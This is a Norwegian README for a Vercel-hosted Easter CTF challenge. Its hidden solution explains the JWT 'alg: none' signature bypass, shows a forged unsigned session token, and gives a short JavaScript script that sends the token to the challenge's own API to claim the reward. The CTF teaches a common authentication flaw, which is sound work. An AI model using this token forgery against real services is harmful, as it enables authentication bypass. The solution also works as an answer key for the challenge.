<p align="center">
  <a href="https://ctf-rubberduck-easter.vercel.app">
    <img src="./screenshot.png" height="300px">
  </a>
</p>

&nbsp;

# Rubberduck påske CTF

En CTF-oppgave bygget med [`lit.js`](https://lit.dev) og [`tailwind.css`](https://tailwindcss.com) ment for å kjøre på [Vercel](https://vercel.com/) ved hjelp av [serverless functions](https://vercel.com/docs/concepts/functions/serverless-functions)

<br>
<hr>
<br>

## Oppgavetekst
> Påskeharen er godt i gang med årets levering av påskeegg, men har hvert år en del defekte egg som ikke vil åpnes. Disse kan selvfølgelige ikke påskeharen utlevere, men det finnes en instruks for hvordan eggene kan åpnes<br>
<br>
Hvert egg har to tilhørende tilfeldig adjektiver som beskriver egget og en "lykke-kode". Påskeharen sier at hvert egg som er låst ikke er korrekt justert for å oppnå sin "lykke-kode". Du kan justere egget ved å finne en hash av typen <code>SHA256(ADJEKTIV_1 + ADJEKTIV_2 + justering)</code> som begynner på eggets "lykke-kode".<br>
<br>
For eksempel så vil et egg med adjektivene <code>brilliant</code> og <code>stappfullt</code> trenge en justing på <code>123</code> for å oppnå sin "lykke-kode" med verdi <code>37964</code>. Fordi <code>SHA256(brilliantstappfullt123) == 37964....</code><br>
<br>
Men vi begynner å lure på om ikke påskeharen har lurt oss i år. Hen vil at vi skal åpne 100 000 000 egg på denne måten før vi får belønningen våres! Klarer du å lure en luring?<br>

<br>

## Installasjon og lokal kjøring
### Prequisits
* [nodejs](https://nodejs.org/en)
* [npm](https://nodejs.org/en)
* [vercel-cli](https://vercel.com/docs/cli)

Etter installasjon av node, `npm install` og `npm i -g vercel` kan prosjektet startes med kommandoen `vercel dev --port 3001`.

For utvikling med Vite hot-relead anbefales det å også kjøre `npm run dev` som vil starte en hot-reaload devserver av frontend på port `3000` (satt opp til å proxye `/api` kall til `http://localhost:3001` (Vercel))

<br>

## Løsning
<details>
  <summary>Klikk for å vise løsningforslag</summary>
  <br>
  Oppgaven spesifiserer at brukeren må klare å "knekke" 100 000 000 påskeegg før man får "belønning". Ettersom knekking av påskeeggene baserer seg på å "gjette" seg frem til en `sha-256` hash som begynner på samme fire bokstaver som "lykke-koden" vil dette i praksis være tidsumulig med dagens datakraft.

  <br><br>

  Dersom vi reverse engineerer kommunikasjonen mellom frontend og backend ser vi at kommunikasjonen er basert på at frontend sender inn korrekt `padding` til `/api/next_egg` endepunktet.

  Dersom `padding` er korrekt så vil backend sende tilbake et nytt egg og slik har vi det gående.

  Dersom vi ser på trafikken nærmere ser vi at backend alltid oppdaterer en cookie `session` for hver korrekt `padding` frontend sender. Denne `session` cookien ser ut til å være en JWT.

  Et eksempel på en slik session er:
  ```
  eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhZGplY3RpdmUxIjoibHlzIiwiYWRqZWN0aXZlMiI6ImjDuHl0ZWtub2xvZ2lzayIsImNoYWxsZW5nZSI6IjQwYTgiLCJzb2x2ZXMiOjE3LCJqdGkiOiJhZjRkMzM5OC1jNGExLTQwNjgtYTk3OS0yYzA2ZWM2NTg5ZDUiLCJpYXQiOjE2ODAyOTYwMjAsImV4cCI6MTY4MDI5OTYyMH0.Y_PRAzod6VyFG021w
  ```

  En JWT er delt opp i tre base64-encoded deler: `header`, `payload` og `signature`. Dersom vi decoder vår JWT får vi følgende strukturer tilbake:
  ```json
  [
    {
      "typ": "JWT",
      "alg": "HS256"
    },
    {
      "adjective1": "lys",
      "adjective2": "høyteknologisk",
      "challenge": "40a8",
      "solves": 17,
      "jti": "af4d3398-c4a1-4068-a979-2c06ec6589d5",
      "iat": 1680296020,
      "exp": 1680299620
    },
    "Y_PRAzod6VyFG021w"
  ]
  ```

  Det finnes flere svakheter med hvordan JWT verifisering kan være implementert på en server. En av hovedsvakhetene (men også en styrke) er at det i det hele tatt kan lese `header` og `payload` feltene uten å verifisere den opp mot `signature` delen.

  En annen svakhet i noen JWT implementasjoner er at algoritmen som brukes for å signere `header` + `payload` ligger klart definert i `header` feltet og kan i en evt. feil-implementasjon bli brukt under validering av JWT-en. <b>Dette er svakheten her</b>

  Dersom vi endrer algoritmen i JWT headeren våres til å spesifisere at `"alg": "none"` skal benyttes (som er en helt gyldig iht. JWT-spesifikasjonen) så kan vi også fritt endre `payload` og fjerne hele `signature` delen:

  ```json
  [
    {
      "typ": "JWT",
      "alg": "none"
    },
    {
      "adjective1": "lys",
      "adjective2": "høyteknologisk",
      "challenge": "40a8",
      "solves": 100000000,
      "jti": "af4d3398-c4a1-4068-a979-2c06ec6589d5",
      "iat": 1680296020,
      "exp": 1680299620
    }
  ]
  ```

  Dersom vi nå koder denne strukturen tilbake til en gyldig JWT:

  ```
  eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhZGplY3RpdmUxIjoibHlzIiwiYWRqZWN0aXZlMiI6ImjDuHl0ZWtub2xvZ2lzayIsImNoYWxsZW5nZSI6IjQwYTgiLCJzb2x2ZXMiOjEwMDAwMDAwMCwianRpIjoiYWY0ZDMzOTgtYzRhMS00MDY4LWE5NzktMmMwNmVjNjU4OWQ1IiwiaWF0IjoxNjgwMjk2MDIwLCJleHAiOjE2ODAyOTk2MjB9
  ```

  Så kan den brukes for å "lure" serveren til å tro at vi nå har åpnet 100 000 000 påskeegg og gi oss belønningen våres

  <br>
  <hr>
  <br>
  
  ### Fullstending løsnings-kode:
  ```javascript
  const header = { typ: "JWT", alg: "none" };
  const payload = { solves: 100000000 };

  const headerAsBase64Url = btoa(JSON.stringify(header)).replaceAll('=', '');
  const payloadAsBase64Url = btoa(JSON.stringify(payload)).replaceAll('=', '');

  const session = `${headerAsBase64Url}.${payloadAsBase64Url}`;

  const { reward } = await fetch('/api/new_egg', { headers: { Cookie: `session=${session}` } })
    .then(response => response.json());

  console.log(`The reward is: ${reward}`);
  ```
  
</details>
